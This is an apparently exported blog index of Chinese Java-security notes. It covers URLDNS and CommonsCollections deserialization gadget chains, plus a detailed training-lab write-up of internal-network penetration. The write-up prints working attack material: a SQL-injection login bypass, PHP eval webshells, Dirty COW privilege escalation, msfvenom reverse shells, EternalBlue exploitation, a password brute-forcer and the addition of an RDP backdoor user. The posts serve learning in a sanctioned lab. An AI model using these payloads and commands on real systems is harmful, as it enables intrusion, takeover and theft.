    <content type="text"><![CDATA[前言URLDNS这条链子的功能就是触发一次DNS请求，因为对第三方库没有依赖和对JDK没有要求，适合用来检测是否存在反序列化漏洞。 利用链分析通过ysoserial这个工具可以看到URLDNS这条链的payload。 比较简短，可以看到，传入的参数是url，返回的是HashMap的实例对象ht，那我们来具体分析一下，这条链到底做了什么。 对一个对象进行反序列化会调用这个对象的readObject方法，首先看看HashMap对象的readObject方法。 1234567891011121314151617181920212223242526272829303132333435363738394041424344private void readObject(java.io.ObjectInputStream s) throws IOException, ClassNotFoundException &#123; // Read in the threshold (ignored), loadfactor, and any hidden stuff s.defaultReadObject(); reinitialize(); if (loadFactor &lt;= 0 || Float.isNaN(loadFactor)) throw new InvalidObjectException("Illegal load factor: " + loadFactor); s.readInt(); // Read and ignore number of buckets int mappings = s.readInt(); // Read number of mappings (size) if (mappings &lt; 0) throw new InvalidObjectException("Illegal mappings count: " + mappings); else if (mappings &gt; 0) &#123; // (if zero, use defaults) // Size the table using given load factor only if within // range of 0.25...4.0 float lf = Math.min(Math.max(0.25f, loadFactor), 4.0f); float fc = (float)mappings / lf + 1.0f; int cap = ((fc &lt; DEFAULT_INITIAL_CAPACITY) ? DEFAULT_INITIAL_CAPACITY : (fc &gt;= MAXIMUM_CAPACITY) ? MAXIMUM_CAPACITY : tableSizeFor((int)fc)); float ft = (float)cap * lf; threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ? (int)ft : Integer.MAX_VALUE); // Check Map.Entry[].class since it's the nearest public type to // what we're actually creating. SharedSecrets.getJavaOISAccess().checkArray(s, Map.Entry[].class, cap); @SuppressWarnings(&#123;"rawtypes","unchecked"&#125;) Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])new Node[cap]; table = tab; // Read the keys and values, and put the mappings in the HashMap for (int i = 0; i &lt; mappings; i++) &#123; @SuppressWarnings("unchecked") K key = (K) s.readObject(); @SuppressWarnings("unchecked") V value = (V) s.readObject(); putVal(hash(key), key, value, false, false); &#125; &#125; &#125; 最后一条语句对key执行hash方法，接下来跟进hash。 在hash方法中，会调用key的hashCode方法，也就是说，通过创建一个HashMap对象，对该对象的key传入其他任意对象，再对HashMap实例进行序列化，再将其进行反序列化时，就会触发执行任意对象hashCode方法。 那么HashMap对象的key传入什么对象才会触发一次DNS请求操作呢？ysoserial传入的是一个URL对象。 接下来，我们看看URL的hashCode方法。 该方法也会调用handler的hashCode方法，并将当前对象传入，handler为URLStreamHandler的实例对象。 进行URLStreamHandler看看hashCode方法。 可以看到方法中调用了getHostAddress，传入的产生为一个URL对象，跟进getHostAddress。 调用用了URL的getHostAddress方法，跟进。 这里我们就看罪魁祸首了，InetAddress.getByName的作用就是根据主机名获取ip地址，会进行一次DNS查询。 那么至此，我们得到一个利用链 1234567HashMap-&gt;readObjectHashMap-&gt;hashURL-&gt;hashCodeURLStreamHandler-&gt;hashCodeURLStreamHandler-&gt;getHostAddressURL-&gt;getHostAddress -&gt; InetAddress.getByName(host) 接下来，通过上面的利用链，自己来构造一条。 12345678910111213141516171819202122232425262728293031323334353637package com.URLDNS;import java.io.*;import java.net.URL;import java.net.URLConnection;import java.net.URLStreamHandler;import java.util.HashMap;public class DNSURL2 &#123; public static void main(String[] args) throws Exception&#123; // 构建URLStreamHandler URLStreamHandler h = new URLStreamHandler() &#123; @Override protected URLConnection openConnection(URL u) throws IOException &#123; return null; &#125; &#125;; // 请求url String url = "http://t60w9vifj3wnsvsu9drcigusijo9cy.burpcollaborator.net"; URL u = new URL(null, url, h); HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;(); map.put(u, 123); // 序列化 FileOutputStream fos = new FileOutputStream("ser.bin"); ObjectOutputStream oos = new ObjectOutputStream(fos); oos.writeObject(map); // 反序列化// FileInputStream fis = new FileInputStream("ser.bin");// ObjectInputStream ois = new ObjectInputStream(fis);// ois.readObject(); &#125;&#125; 这里将反序列化注释后，依旧会触发一次dns请求，原因是我们将URL对象放进HashMap也就是执行put操作的时候，也会执行一次hash方法，多多少少还是有点瑕疵。 规避在序列化就执行dns请求的方法也很简单，在URL类的hashCode方法中。 我们只需要在执行put前将URL对象的hashCode通过反射改成除了-1之外的其他数，然后再在序列化前将hashCode改回-1,就能规避掉这个瑕疵。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748package com.URLDNS;import java.io.*;import java.lang.reflect.Field;import java.net.URL;import java.net.URLConnection;import java.net.URLStreamHandler;import java.util.HashMap;public class DNSURL2 &#123; public static void main(String[] args) throws Exception&#123; // 构建URLStreamHandler URLStreamHandler h = new URLStreamHandler() &#123; @Override protected URLConnection openConnection(URL u) throws IOException &#123; return null; &#125; &#125;; // 请求url String url = "http://j04kqf.dnslog.cn"; URL u = new URL(null, url, h); // 防止在执行put时触发dns查询 setFieldValue(u, "hashCode", 111); HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;(); map.put(u, 123); // 改回来 setFieldValue(u, "hashCode", -1); // 序列化 FileOutputStream fos = new FileOutputStream("ser.bin"); ObjectOutputStream oos = new ObjectOutputStream(fos); oos.writeObject(map); // 反序列化 FileInputStream fis = new FileInputStream("ser.bin"); ObjectInputStream ois = new ObjectInputStream(fis); ois.readObject(); &#125; public static void setFieldValue(Object o, String f, int v) throws Exception&#123; Class c = o.getClass(); Field field = c.getDeclaredField(f); field.setAccessible(true); field.set(o, v); &#125;&#125; 这样就解决了URLDNS这条链子触发两次的情况。 ysoserial解决两次触发的方式但是在ysoserial中，并不算这样做的。 他写了一个继承继承了URLStreamHandler的SilentURLStreadHandler类，重写了getHostAddress方法。 可以看到，直接返回了null，为什么这样也可以呢。我们只需要看看URL中传入的handler参数修饰符就知道了。 transient修饰符的作用是将这个属性就不会序列化到指定的目的地中。也就是说，HashMap在执行put方法的时候，调用的方法不是URLStreamHandler中的getHostAddress方法，而是自己构造继承至URLStreamHandler的SilentURLStreamHandler中重新的getHostAddress，因为返回null，所有在序列化前并不会触发dns请求。而这个方法也并不会序列化进对象，所以在反序列化的时候调用的为URLStreamHandler中的getHostAddress，才执行了dns请求。 参考文章木头师傅 https://www.yuque.com/tianxiadamutou/zcfd4v/fewu54#f3b2a19f Java安全漫谈 - 08.反序列列化篇(2)]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>java安全漫谈</tag>
        <tag>java反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[记一次内网渗透测试实训总结]]></title>
    <url>%2F2022%2F06%2F19%2F%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E8%AE%AD%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[前言时间很快就来到了学期的最后一个月，和上学期一样，最后的几周是实训周，而这次实训恰好就是我比较喜欢的网络攻防，因为之前学过相关的知识，做过一些靶场，相比于其他同学做起来要快些，不过内网渗透也还是头一次，得益于这次的内网渗透靶场环境，小小地体验了一下，期间也踩了许多坑，也陆陆续续地解决掉了。所以就以本篇文章做个总结，目的在于梳理所学到地知识点和分享。 环境&amp;工具物理机 (win 10) ip：172.20.10.1 工具：蚁剑、火狐（hackbar插件） 攻击机（kali） ip：172.20.10.129 工具：MSF框架、Burpsuite、冰蝎、weevely、Nmap、Proxychains4 … 靶场拓扑图 渗透过程准备首先需要拿到一个入口地址 在FW中查看 这个是Web服务器的外网地址 10.100.1.104，直接访问是访问不到的，需要使用老师给的vpn。 这里直接在kali中配置vpn， 得到一个10.200.0.77地址。（这里得到的地址会经常变，后面操作的时候可能会不一致） 渗透测试web服务器刚刚通过查看FW防火墙的配置拿到了web服务器的地址10.100.1.104 信息收集端口扫描 123nmap -sT 10.100.1.104 -sV# sT tcp三次握手扫描(默认为sT)# sV 扫描服务的版本信息 开放了80端口，web服务器是用Apache 2.2.15，操作系统为Centos web渗透测试登录处存在万能密码 or 1=1 #绕过 成功进入到后台管理界面 在用户管理-&gt;头像编辑处存在文件上传绕过检测漏洞 使用kali自带的weevely工具生成php后门 1weevely generate 123456 backdoor.php 进行上传 在头像处找到后门的上传地址 连接php后门 1weevely http://10.100.1.104/avatar/admin.php 123456 已经成功拿到一个webshell权限 漏洞分析sql注入漏洞分析 刚刚是用sql注入进入的后台，burp抓包发现是请求的login.php文件，接下来对该文件进行分析。 1234567891011121314151617181920212223242526272829303132333435# 省略了无关紧要的代码&lt;?phpif (isset($_POST['submit'])) &#123; include 'config/dbconnect.php'; // Get input $email = $_POST['email']; $password = md5($_POST['password']); // Check database $query = "SELECT username, isadmin FROM users WHERE email = '$email' and password = '$password';"; $result = mysqli_query($conn, $query); $num = @mysqli_num_rows($result); // The '@' character suppresses errors if ($num &gt; 0) &#123; // Feedback for end user while ($row = mysqli_fetch_assoc($result)) &#123; $_SESSION['logged'] = true; $_SESSION['username'] = $row["username"]; if ($row["isadmin"] == 1) &#123; $_SESSION['isadmin'] = true; &#125; else &#123; $_SESSION['isadmin'] = false; &#125; header("Location: http://" . $_SERVER['HTTP_HOST'] . "/admin.php?page=dashboard"); &#125; &#125; else &#123; // Feedback for end user $_SESSION['logged'] = false; echo "&lt;script&gt;$('#login-alert').removeClass('d-none')&lt;/script&gt;"; &#125; mysqli_close($conn);&#125;?&gt; 全局变量POST接收了email和password，登录的sql语句为 1$query = "SELECT username, isadmin FROM users WHERE email = '$email' and password = '$password';"; 可以发现没怎么过滤，传入的密码进行md5加密，我们在email处构造的万能密码admin&#39;or 1=1 #，拼接到sql语句中为 1$query = "SELECT username, isadmin FROM users WHERE email = 'admin'or 1=1 #' and password = '$password';"; sql语句中#为注释符，这里真正执行的sql语句为 1SELECT username, isadmin FROM users WHERE email = 'admin'or 1=1； &#39;admin&#39; or 1=1 这个where条件，会查询出所有的用户名。 查询得记录值不少于1条就会进入if语句，进而执行$_SESSION[&#39;logged&#39;] = true;。 1234567891011121314151617if ($num &gt; 0) &#123; // Feedback for end user while ($row = mysqli_fetch_assoc($result)) &#123; $_SESSION['logged'] = true; $_SESSION['username'] = $row["username"]; if ($row["isadmin"] == 1) &#123; $_SESSION['isadmin'] = true; &#125; else &#123; $_SESSION['isadmin'] = false; &#125; header("Location: http://" . $_SERVER['HTTP_HOST'] . "/admin.php?page=dashboard"); &#125; &#125; else &#123; // Feedback for end user $_SESSION['logged'] = false; echo "&lt;script&gt;$('#login-alert').removeClass('d-none')&lt;/script&gt;"; &#125; 而后访问admin.php，只会对$_SESSION[&#39;logged&#39;]进行验证。所以成功登录了后台。 123456&lt;?phpsession_start();if (!(isset($_SESSION['logged']) &amp;&amp; $_SESSION['logged'])) &#123; header("Location: http://" . $_SERVER['HTTP_HOST'] . "/login.php");&#125;?&gt; 文件上传漏洞分析 后面是使用了文件上传漏洞绕过文件类型检测上传了php木马。通过burp发现，最终请求了users.php文件 关键代码逻辑如下 12345678910111213141516171819202122if (isset($_POST['submit'])) &#123; if (isset($_FILES["file"])) &#123; // 获取文件后缀名 $tmp = explode(".", $_FILES["file"]["name"]); $extension = end($tmp); if ((($_FILES["file"]["type"] == "image/png")) &amp;&amp; ($_FILES["file"]["size"] &lt; 204800) // 小于 200 kb ) &#123; if ($_FILES["file"]["error"] &gt; 0) &#123; echo "错误：: " . $_FILES["file"]["error"] . "&lt;br&gt;"; &#125; else &#123; if (move_uploaded_file($_FILES["file"]["tmp_name"], "avatar/" . "admin" . "." . $extension)) &#123; echo "头像上传成功"; &#125; else &#123; echo "头像上传失败"; &#125; &#125; &#125; else &#123; echo "只能上传png格式且小于200KB"; &#125; &#125;&#125; 最关键的验证代码为 123if ((($_FILES["file"]["type"] == "image/png")) &amp;&amp; ($_FILES["file"]["size"] &lt; 204800) // 小于 200 kb ) 这里只对文件的类型和文件大小进行了验证，并没有对后缀名进行验证。所以这里将Content-Type: image/png 进行绕过即可上传。 提权我们已经拿到了一个权限为apache的shell，接下来将权限提升到root。 首先查看该Linux的内核版本 1uname -a 使用kali中的searchsploit工具搜索版本号为2.6 相关的提权漏洞，Linux中最出名的一个提权漏洞，影响范围Linux kernel &gt;= 2.6.22，直接搜关键字dirty. 1searchsploit 2.6 | grep -i &quot;dirty&quot; 拷贝到当前路径下 1searchsploit -m 40839 . 接下来通过weevely工具将40839.c文件上传到web服务器的/tmp路径下 1:file_upload /home/kali/40839.c /tmp/40839.c 在40839.c文件中可以找到编译该这个脚本的方式 1gcc -pthread 40839.c -o dirty -lcrypt 赋予执行权限&amp;执行 12chmod +x dirty./dirty 123456 已经执行了但是没有回显，直接Ctrl+C断掉中断，再重连，通过查看cat /etc/passwd看看是否替换掉了root用户 发现已经成功变成了firefart用户，说明已经提权成功。 ssh连接查看flag因为防火墙的只放行了80端口，不能直接通过远程主机的22端口进行ssh连接，所以我们需要用msf做一个端口转发，将web服务器的22端口转发到本地的2222端口。 接下来使用msfvenom生成一个linux后面文件 1msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=10.200.0.47 lport=9876 -f elf &gt; shell9876 通过weevely将后门文件shell9876上传至web靶机的/tmp目录下 1:file_upload /home/kali/shell9876 /tmp/shell 接下来打开msfconsole进行监听 12345use exploit/multi/handlerset payload linux/x64/meterpreter/reverse_tcp set lhost 0.0.0.0set lport 9876run 回到weevely界面中，赋予shell执行权限并执行 1chmod +x shell&amp;./shell 回到msfconsole终端下 已经成功反弹（这里仔细看的话会发现反弹ip地址不对，是因为ip地址临时变了一次） 接下来将web服务器的22端口转发到本地的2222端口 1portfwd add -l 2222 -r 127.0.0.1 -p 22 接下来直接ssh连接127.0.0.1,端口为 2222，密码为123456 1ssh firefart@127.0.0.1 -p 2222 成功拿下 注意：如果要返回到从meterpreter返回到模块配置界面输入background,会返回一个session号，这个在后面配置路由的时候会用到。 内网横向移动内网横向移动可以通过msf添加路由用msf自带模块扫C段，或者配置socks5代理服务，配置proxychains4用nmap来扫。这里根据分析http请求日志来拿到内网网段。 查看日志日志目录 1/var/log/httpd 在access_log-20211018日志文件中发现一个网段192.168.223.0 接下来通过 socks5代理的方式，用nmap探测192.168.223.0存活的主机。 配置路由在msf中配置路由 1route add 192.168.223.0 255.255.255.0 1 开启socks5代理服务使用use auxiliary/server/socks_proxy模块开启sockes5代理服务。 查看1080端口是否开启 1netstat -lnt 配置proxychains4接下来使用proxychains4工具来进行我们的socks5代理，使用这个工具前需要对其配置文件进行配置 配置文件路径/etc/proxychains4.conf，在其末尾添加socks服务的ip 和端口 1sudo vim /etc/proxychains4.conf Namp探测网段主机存活123proxychains4 nmap -sn 192.168.223.0/24# sP ping扫描# sn ping探测扫描主机,不进行端口扫描 （测试过对方主机把icmp包都丢弃掉，依然能检测到对方开机状态） 注意：这里有个小坑，用proxychains4代理工具+nmap 进行扫描，扫描出来的ip全都是存活的，在网上没有找到解决这个问题的资料，但也不妨碍继续渗透，可以在proxychains转发日志中发现那些ip是真正存活的。 通过nmap主机发现得到了192.168.223.1和192.168.223.3两个ip地址，接下来对223.1进行渗透测试。 内网渗透：OA系统信息收集端口扫描 1proxychains4 nmap -sT 192.168.223.1 -sV 目标主机开放了22、80端口，发现web服务器为nginx1.18.0 ，操作系统为Ubuntu。接下对web服务进行渗透测试。 web渗透测试注意：使用kali中的浏览器对192.168.223.1进行访问，需要对浏览器配置socks5代理。 使用kali中的firefox火狐浏览器，我直接使用foxyProxy插件配置代理，方便切换。 配置的socks5代理 密码爆破一个登录界面 输个123456,登录。 提示密码为5位数，10000-99999之间，需要对登录界面进行爆破。两种方式，一个是使用burp里的intruder模块进行爆破，二是自己写爆破脚本。 第一种方式：使用burp里的intruder模块进行爆破 注意 ：需要给浏览器配置socks5代理才能访问192.168.223.1,但是想要使用burp进行抓包，需要浏览器配置burp的代理，如果配置了burp的代理就不能访问了192.168.223.1，所以我们需要对burp进行配置一个前置代理。也就是给火狐配置burp的代理，给burp配置内网socks5代理。 在burp suite-&gt;User options模块下配置 接下来，burp抓取登录包，send to intruder 配置Positions 配置Payloads 开始爆破 注意：kali里的burp suite为社区版，猜测是做了限制，跑起来非常得慢，可以在物理机上使用破解后的burp进行爆破，会快很多，或者自己编写python脚本进行爆破。 爆破成功的截图 第二种方式：自己编写Python爆破脚本 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667import requestsimport queue,threadingimport time,sysflag = 0 # 0代表 未找到 1 代表找到def getPwd(): q = queue.Queue() for i in range(10000, 99999): q.put(i) return qdef exp(pwd): global flag url = "http://192.168.223.1/login.php" # 这里为靶机的IP，都一致，不用修改 # 配置代理 proxies = &#123; "http": "socks5://172.20.10.129:1080" # 1. 这里自己的socks5代理地址 &#125; headers = &#123; "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0", &#125; datas = &#123; "username": "admin", "password": pwd, "logintype": 0, "adminmobile": "", "adminmobileyzm": "", "submit": "%E7%99%BB%E5%BD%95", &#125; try: print("[*] passwd:%s"%(pwd)) resp = requests.post(url=url, data=datas, headers=headers, proxies=proxies) if "用户名或密码错误，密码是5为数字" not in resp.text: print("[+] username:%s passwd:%s"%(datas["username"], pwd)) flag = 1 except: print("[-] 请求故障 检查网络或者代理") time.sleep(2)if __name__=='__main__': # 拿到 5位数所有密码 q = getPwd() # 创建线程池 threads = [] # 输出队列 while not q.empty(): # 创建多线程并启动多线程 for i in range(20): # 2. 这里可以设置线程的大小 默认为20 可以根据电脑配置自行设置 thread = threading.Thread(target=exp, args=(q.get(),), name='thread') threads.append(thread) thread.start() # 设置堵塞 for thread in threads: thread.join() # 找到停止 if flag == 1: time.sleep(2) import sys sys.exit() 注意：需要在脚本的第20行修改为自己的socks代理，线程默认为20，可改可不改 结果 拿到密码后，接下来登录后台 存在两个漏洞，可以在头像修改处发现文件上传漏洞，但是上传的文件没有执行权限，在后台页面的存在文件包含漏洞。 文件上传+文件包含getshell文件上传可以上传，但是对上传路径是没有访问权限。 测试文件包含漏洞 1http://192.168.223.1/?page=../../../../../etc/passwd 成功包含出/etc/passwd 上传图片马，我的图片马文件内容为 文件名：shell.php.png 12GIF89a&lt;?php eval($_POST['shell']);?&gt; 不需要抓包，直接将后缀改成png格式，直接上传。在头像出找到头像的路径。 接下来，对该文件进行包含 传参进行测试，（我kali中的firefox的hackbar不太听使唤，这里我直接在win10上对firefox配置kali的socks5代理进行测试） 成功执行了phpinfo();函数。 命令执行写马我直接通过win10下的蚁剑进行连接，但是一直报错 注意：蚁剑也需要配socks5代理 可以执行命令，但是却连接不上，接下来通过命令执行在网站根目录写一句话木马 12echo &quot;PD9waHAgZXZhbCgkX1BPU1RbJ3NoZWxsJ10pOz8+&quot; | base64 -d &gt;3.php# &lt;?php eval($_POST[&apos;shell&apos;]);?&gt; 123http://192.168.223.1/?page=./avatar/admin.png# postshell=system(&apos;echo &quot;PD9waHAgZXZhbCgkX1BPU1RbJ3NoZWxsJ10pOz8+&quot; | base64 -d &gt;3.php&apos;); 成功写入 蚁剑连接 注意：这里会存在连接不上的情况，需要多次尝试，有机会能连上。 蚁剑连接极其不稳定，这里选择在/tmp目录上传一个linux后门，将shell反弹给msf。 运气比较好，一次就上传成功了，正常情况可能需要多次尝试上传。 打开蚁剑的虚拟终端 切换到/tmp目录下，赋予后门执行权限，可以看到执行了很多次才有反应。 回到MSF下进行监听 执行后门 成功反弹（在msf的shell下执行命令流畅很多）。 在Meterpreter中执行shell得到的终端一片空白 获得一个带标识得终端 1script -qc /bin/bash /dev/null 漏洞分析文件上传分析（直接打包网站源码在win10下进行分析） 123456789101112131415161718192021if (isset($_POST['submit'])) &#123; if (isset($_FILES["file"])) &#123; // 获取文件后缀名 $tmp = explode(".", $_FILES["file"]["name"]); $extension = end($tmp); if ((($_FILES["file"]["type"] == "image/png")) &amp;&amp; ($_FILES["file"]["size"] &lt; 204800) // 小于 200 kb ) &#123; if ($_FILES["file"]["error"] &gt; 0) &#123; echo "&lt;script&gt;alert(错误：: " . $_FILES["file"]["error"] . "&lt;br&gt;)&lt;/script&gt;"; &#125; else &#123; if (move_uploaded_file($_FILES["file"]["tmp_name"], "avatar/" . 'admin' . "." . $extension)) &#123; echo "&lt;script&gt;alert('头像上传成功')&lt;/script&gt;"; &#125; else &#123; echo "&lt;script&gt;alert('头像上传失败')&lt;/script&gt;"; &#125; &#125; &#125; else &#123; echo "&lt;script&gt;alert('只能上传png格式且小于200KB')&lt;/script&gt;"; &#125; &#125; 跟跳板机web服务器的文件上传一模一样，不多说了，可以通过修改Content-Type进行绕过，唯一不同的是对当前web服务的上传路径没有访问权限。 文件包含 12345678&lt;?php if (isset($_GET['page'])) &#123; $file = $_GET['page']; include $file; &#125; else &#123; echo "&lt;SCRIPT LANGUAGE=\"JavaScript\"&gt;location.href='/?page=grbg.php'&lt;/SCRIPT&gt;"; &#125;?&gt; 从page参数接收文件名，然后对该文件名进行文件包含，可以发现没有任何限制，想怎么玩都可以。 查看数据库配置文件当我们拿到一个webshell后，虽然权限不高，有很多限制，但是依旧可以通过查看数据库配置文件，拿到数据库的账号密码，然后登录进行查看一些敏感信息。在config/dbconnect.php文件中发现 通过查看数据库配置文件得到mysql服务器的IP、用户名、密码和当前连接的数据库名。意味着我们可以远程连接到192.168.223.3这个主机的mysql服务器。这里先不管，待会再说，先尝试提权。 提权注意：通过测试不能提到root权限，也问了老师，这台靶机可以不用提到root，以下只是尝试的过程。 Linux的内核版本为5.4.0，操作系统Ubuntu 20.04，版本比较新，未发现提权漏洞。 看看能不能利用文件有特殊执行权限的suid或sgid进行提取 12find / -perm -u=s -type f 2&gt;/dev/null //查找suid文件find / -perm -g=s -type f 2&gt;/dev/null //查找sgid文件 重点关注到sudo和pkexec，因为这两个命令被爆出提权漏洞。 根据这篇文章 https://www.geekby.site/2021/01/cve-2021-3156%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/ 先查看第一个sudo的版本号 刚好符合在影响版本范围内，进行判断 1sudoedit -s / 好像并不 存在漏洞。 第二个 看起来好像符合漏洞存在的范围，快速判断试试 1sudoedit -s / 好像报错了，但是跟存在漏洞的报错又完全不一样。 我按照博客上文章进行提权。 也没有成功。 接下来把希望放在pkexec，CVE号CVE-2021-4034,这是去年才爆出来的的漏洞。 提权脚本 https://github.com/berdav/CVE-2021-4034 成功提到root，还是有点惊喜。 内网渗透：DB服务器渗透刚刚在查看数据库配置文件的时候发现了192.168.223.3这个IP和数据库的账号密码，接下来对该主机进行渗透测试。 信息收集端口扫描 1proxychains4 nmap -sT 192.168.223.3 -sV 开启了80、22、111、3306端口，操作系统为Centos。 web渗透测试 看起来是一个phpMyadmin网站，用来管理mysql数据库的，但是访问连个登录框都没有。 利用Mysql服务写马接下来用刚刚在配置文件中找的数据库用户名密码进行连接mysql。 1proxychains4 mysql -h 192.168.223.3 -u oa -p 144d993ba34367792dfe58370935c4b5 成功登录，接下来看看数据库是否具有读写权限。 1select load_file(&quot;/etc/passwd&quot;); 具有读权限，尝试往网站目录/var/www/html下写一句话木马。 1select 1,&quot;666&lt;?php eval($_POST[&apos;shell&apos;]);?&gt;&quot; into outfile &quot;/var/www/html/shell.php&quot;; 访问 成功写入，蚁剑连接（还是会遇到连不上的问题，多连几次就好） 上传Linux后门，反弹到msf 执行 反弹成功 提权 内核版本和跳板机一样，提权步骤也一样。 上传提权脚本 1meterpreter &gt;upload /home/kali/40839.c /tmp/40839.c 编译 1gcc -pthread 40839.c -o dirty -lcrypt 赋予执行权限并执行 1chmod 777 dirty &amp;&amp; ./dirty ssh连接1proxychains4 ssh firefart@192.168.223.3 成功拿下 内网渗透：Windows服务器最初，我从外网访问到内网的一台web服务器，通过web漏洞上传php后门渗透进入web服务器，上传了Linux后门，反弹到了MSF上，在通过MSF的route add添加了一条192.168.223.0的路由，用use auxiliary/server/socks_proxy 开启socks5的代理服务，利用proxychains4配置代理后，利用nmap对192.168.223.0/24网段进行主机发现，扫出192.168.223.1和192.168.223.2两个ip，通过文件上传+文件包含的方式拿下了192.168.223.1这台服务器，还剩下192.168.223.2未进行测试,接下来，将对192.168.223.2进行渗透测试。 信息搜集端口扫描 1proxychains4 nmap -sT 192.168.223.2 -sV 可以看到开放了很多端口,主要关注135、139、445三个端口，重点关注445，17年的永恒之蓝漏洞利用工具就是对该端口进行利用，该主机的操作系统Windows Server 2008 R2。 永恒之蓝接下来使用代理过后的 msf进行检测 1proxychains4 msfconsole 关键字ms17-010搜索利用模块 1search ms17-010 可以先使用模块auxiliary/scanner/smb/smb_ms17_010进行检测，再使用exploit/windows/smb/ms17_010_eternalblue进行利用，不过后者再进行利用的时候也会对其先进行检测，所以直接使用exploit/windows/smb/ms17_010_eternalblue模块。 12use 0 # 直接选择搜索出来的模块 配置模块 注意：这个模块默认使用windows/x64/meterpreter/reverse_tcp作为payload,因为使用了代理，会出现利用成功却不能反弹回来的情况，所以需要将paylaod改为windows/x64/meterpreter/bind_tcp。 12set RhOSTS 192.168.223.2set payload windows/x64/meterpreter/bind_tcp 执行 可以发现，该模块先使用了auxiliary/scanner/smb/smb_ms17_010进行了检测，并检测出了永恒之蓝漏洞。但是这里需要注意的是，不一定百分百连接上，很大可能性利用成功却反弹不回来，多尝试几次就可以连上。 尝试了四次才成功 因为445端口是smb服务，而smb服务又是系统服务，从该端口拿到的权限就是管理员权限，所以不需要进行提权。 权限维持接下来利用MSF的run post/windows/manage/enable_rdp模块开启windows主机的3389远程桌面 1run post/windows/manage/enable_rdp #开启远程桌面 添加一个用户 1run post/windows/manage/enable_rdp USERNAME=fany PASSWORD=123456 #添加用户 将windwos服务器的3389转发到攻击机kali的6662端口 1run post/windows/manage/enable_rdp FORWARD=true LPORT=3389 #将windows服务器的3389端口转发到kali的3389端口 接下来，通过win10下的远程桌面连接（mstsc.exe）工具连接到kali的3389端口 也可以直接在kali执行 1rdesktop -u fany -p 123456 127.0.0.1:3389 永恒之蓝方程式的原生稳定利用方式因为挂了代理，MSF利用起来不是很稳定，有的同学可能有点完美主义，觉得需要多次尝试不够帅气，有没有一次并且很稳定利用成功的方法呢，答案是有，利用shadowbroker工具里的fb.py进行利用，然后通过加载dll的方式加载MSF生成的dll后门，进行反弹。不过我在当前的windows靶机中没有复现成功，报了一个[-] ERROR unrecognized OS string的错误，具体原因参考这篇文章https://captmeelo.com/pentest/2018/06/26/patching-doublepulsar.html，网上相关资料比较少，没继续搞。不过自己在本地搭建的win7环境中，使用该工具能够反弹成功，总之也提供了另一种思路，想学习也可以参考这几篇文章： https://zhuanlan.zhihu.com/p/153541322 https://blog.51cto.com/hashlinux/2092863 知识点汇总获得一个带标识得终端123python -c &apos;import pty;pty.spawn(&quot;/bin/bash&quot;)&apos;python3 -c &apos;import pty;pty.spawn(&quot;/bin/bash&quot;)&apos;script -qc /bin/bash /dev/null 使用EW做反向代理服务器12本地：ew_for_Win.exe -s rcsocks -l 8888 -e 8001远程：./ew_for_linux64 -s rssocks -d 10.200.0.42 -e 8001 命令执行写马1?shell=system(&apos;echo &quot;PD9waHAgZXZhbCgkX1BPU1RbJ3NoZWxsJ10pOz8+&quot; | base64 -d &gt;3.php&apos;); Hydra对ssh进行爆破12345hydra -l 用户名 -P 密码字典 ssh://IP:Port -f -vV -t 10# -l 代表指定一个用户名 -L 代表指定一个用户名字典（密码也是一样）# -f 代表找到后停止# -vV 展示枚举过程# -t 线程 总结 正如一个朋友所说，每个靶机拿到权限的难度很容易，但是很容易被一些细节性的知识点给卡死。我开始做的时候也是一样，先是MSF的代理不能代理，然后换成EW做反向代理，但又不够稳定，遇到解析不了的域名直接就会断掉，尤其是使用火狐浏览器，火狐会自动发一些包到它的服务器，在内网环境下，不能出网，也会直接给断掉。后来搞懂了MSF代理的使用后，才好得多。再就是对内网靶机进行渗透的时候，后门传上去，但是却连不上的问题，还有有OA系统那台服务器的提权，最开始没提上去，后面又成功提上去，都是经过了一次次尝试，最后才成功的，其实这个过程即痛苦又挺有意思，学到东西也很有成就感，总之，搞安全就是需要不断学习，不断进步的。]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Java安全学习笔记（二）]]></title>
    <url>%2F2022%2F06%2F04%2FJava%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89%2F</url>
    <content type="text"><![CDATA[前言最近在看p牛的Java安全漫谈反序列化篇，详细分析了CommonsCollections 这条链。 环境​ jdk 版本 &lt;=8u70 ​ Apache Commons Collections &lt;= 3.2.1 CommonsCollections 分析先给出完整的利用链 1234567891011121314151617Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer("getMethod", new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;"getRuntime",null&#125;), new InvokerTransformer("invoke", new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;), new InvokerTransformer("exec", new Class[]&#123;String.class&#125;, new Object[]&#123;"calc"&#125;)&#125;;ChainedTransformer transformer = new ChainedTransformer(transformers);HashMap&lt;Object, Object&gt; map = new HashMap&lt;Object, Object&gt;();map.put("value", "value");Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(map, null, transformer);Class&lt;?&gt; annotationInvocationHandler = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");Constructor&lt;?&gt; constructor = annotationInvocationHandler.getDeclaredConstructor(Class.class, Map.class);constructor.setAccessible(true);Object o = constructor.newInstance(Retention.class, transformedMap);UnSerializ(Serializ(o)); 利用点从利用点开始分析 InvokerTransformer-&gt;transform 1234567891011121314151617public Object transform(Object input) &#123; if 